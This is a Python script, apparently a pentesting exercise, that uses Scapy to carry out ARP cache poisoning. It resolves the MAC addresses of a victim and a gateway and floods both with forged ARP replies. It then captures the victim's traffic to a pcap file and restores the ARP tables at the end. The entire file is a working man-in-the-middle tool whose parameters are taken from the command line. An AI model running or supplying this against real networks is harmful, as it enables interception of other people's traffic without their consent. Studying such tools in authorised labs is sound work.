from multiprocessing import Process # this allow functions to run parallel (use in sniffing and posioning)
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap
import os 
import sys
import time

def get_mac(targetip):
    # Ether specifies that this packet is to be broadcast.
    # ARP specifies that request for the MAC address, asking each node whether it has the target ip.
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=targetip, op="who-has")
    # srp send and receive packets at network layer (layer 2)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface="wlp0s20f3"):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0
        print(f"Initialized {interface}: ")
        print(f"Gateway: ({gateway}) is at {self.gatewaymac}.")
        print(f"Victim: ({victim}) is at {self.victimmac}.")
        print('-'*30)
    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()
        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()
    def poison(self):
        poison_victim = ARP(op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac)
        print(f"ip src: {poison_victim.psrc}")
        print(f"ip dst: {poison_victim.pdst}")
        print(f"mac dst: {poison_victim.hwdst}")
        print(f"mac src: {poison_victim.hwsrc}")
        print(poison_victim.summary())
        print('-'*30)
        poison_gateway = ARP(op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac)
        print(f"ip src: {poison_gateway.psrc}")
        print(f"ip dst: {poison_gateway.pdst}")
        print(f"mac dst: {poison_gateway.hwdst}")
        print(f"mac src: {poison_gateway.hwsrc}")
        print(poison_gateway.summary())
        print('-'*30)
        print(f"Beginning the ARP poison. [CTRL-C to stop]")
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)
    def sniff(self, count=2000):
        time.sleep(5)
        print(f"Sniffing {count} packets.")
        bpf_filter = f"ip host {victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arp_poison.pcap', packets)
        print("Got the packets.")
        self.restore()
        self.poison_thread.terminate()
        print("Finished.")
    def restore(self):
        print("Restoring the ARP tables.")
        send(ARP(op=2, pdst=self.victim, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewaymac), count=5)
        send(ARP(op=2, pdst=self.gateway, psrc=self.victim, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimmac), count=5)
if __name__ == "__main__":
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()
